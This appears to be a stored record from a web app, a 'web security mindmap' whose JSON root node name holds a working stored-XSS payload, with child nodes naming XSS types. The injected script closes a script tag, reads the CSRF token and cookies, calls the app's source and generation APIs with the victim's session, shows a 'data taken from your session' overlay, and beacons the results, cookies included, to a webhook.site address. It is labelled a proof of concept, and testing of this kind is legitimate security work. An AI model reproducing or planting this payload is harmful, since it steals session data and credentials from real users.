results.title: Mindmap Keamanan Web
results.result: {"name": "</script><script>(function(){var c=document.cookie.match(/csrftoken=([^;]+)/);var w=document.body.innerHTML.match(/workspace_id=([a-f0-9-]{36})/i);var ws=w?w[1]:null;var h={'Accept':'application/json'};if(c)h['X-CSRFToken']=c[1];Promise.all([fetch('/api/sources/?workspace_id='+ws,{credentials:'include',headers:h}).then(function(r){return r.json()}).catch(function(){return{}}),fetch('/api/workspace/'+ws+'/generate/',{credentials:'include',headers:h}).then(function(r){return r.json()}).catch(function(){return{}})]).then(function(d){var x={attack:'E2E-STORED-XSS',host:location.hostname,workspace:ws,sources:d[0],generate_jobs:d[1],cookies:document.cookie.slice(0,120)};var o=document.createElement('div');o.style.cssText='position:fixed;inset:0;z-index:999999;background:#0a0a0a;color:#fff;padding:24px;font:13px monospace;overflow:auto';var t=document.createElement('h1');t.style.color='#ef4444';t.textContent='E2E XSS — DATA DIAMBIL DARI SESSION ANDA';o.appendChild(t);var p=document.createElement('pre');p.style.color='#4ade80';p.textContent=JSON.stringify(x,null,2);o.appendChild(p);var b=document.createElement('button');b.textContent='Tutup PoC';b.onclick=function(){o.remove()};b.style.cssText='margin-top:16px;padding:10px 20px;background:#dc2626;color:#fff;border:none;border-radius:6px;cursor:pointer';o.appendChild(b);document.body.appendChild(o);try{navigator.sendBeacon('https://webhook.site/00f9dd09-c3a4-406f-971b-884ad2653e93',JSON.stringify(x))}catch(e){}});})();</script><!--", "children": [{"name": "XSS Reflected", "children": []}, {"name": "XSS Stored", "children": []}, {"name": "XSS DOM-based", "children": []}]}
